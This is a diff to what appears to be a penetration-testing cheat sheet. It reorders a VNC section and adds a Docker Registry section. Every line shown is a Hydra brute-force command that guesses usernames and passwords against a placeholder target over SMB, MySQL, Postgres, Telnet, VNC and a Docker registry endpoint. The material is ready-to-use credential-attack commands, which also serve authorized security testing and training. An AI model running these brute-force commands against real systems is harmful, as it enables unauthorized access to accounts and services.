@@ -341,12 +341,6 @@ $ hydra <RHOST> -L usernames.txt -P passwords.txt smb -V -f
 $ hydra <RHOST> -L usernames.txt -P passwords.txt mysql -V -f
 ```
 
-### VNC
-
-```c
-$ hydra <RHOST> -P passwords.txt vnc -V
-```
-
 ### Postgres
 
 ```c
@@ -357,6 +351,18 @@ $ hydra <RHOST> -L usernames.txt -P passwords.txt postgres -V
 
 ```c
 $ hydra <RHOST> -L usernames.txt -P passwords.txt telnet -V
+```
+
+### VNC
+
+```c
+$ hydra <RHOST> -P passwords.txt vnc -V
+```
+
+### Docker Registry
+
+```c
+$ hydra <RHOST> -L usernames.txt  -P passwords.txt -s 5000 https-get /v2/
 ```
 
 ### Webform
